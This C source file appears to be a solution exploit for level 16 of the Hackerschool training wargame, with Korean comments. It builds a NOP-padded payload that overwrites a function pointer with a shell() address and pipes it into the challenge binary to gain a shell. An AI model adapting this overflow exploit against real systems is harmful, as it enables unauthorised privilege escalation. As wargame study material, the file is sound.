/*
 * Author : superdk@hanmail.net
 * DATA : exploit about hackerschool level16
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90
#define BUFSIZE 44   /* NOP(40) + &shell() */

// "shell() 함수" 의 시작 주소
char writecode[] = "\xd0\x84\x04\x08";

int main()
{
    char shellBuf[BUFSIZE], cmdBuf[320];
    int i, j, shellLen;
    
    shellLen = strlen(writecode);

	// "void *call()" 함수 앞까지는 NOP 로 채움
    for(i=0; i<sizeof(shellBuf)-shellLen; i++)
        shellBuf[i] = NOP;
    
	// "printit() 함수의 시작 주소를 "shell() 함수" 의 시작 주소로 덮어씀
    for(j=0; j<shellLen; j++)
        shellBuf[i++] = writecode[j];
    
    // 공격 명령어 생성
    sprintf(cmdBuf, "(perl -e \'print \"");
    strcat(cmdBuf, shellBuf);
    strcat(cmdBuf, "\"\'; cat) | /home/level16/attackme");
    strcat(cmdBuf, "\x0a");
    system(cmdBuf);
}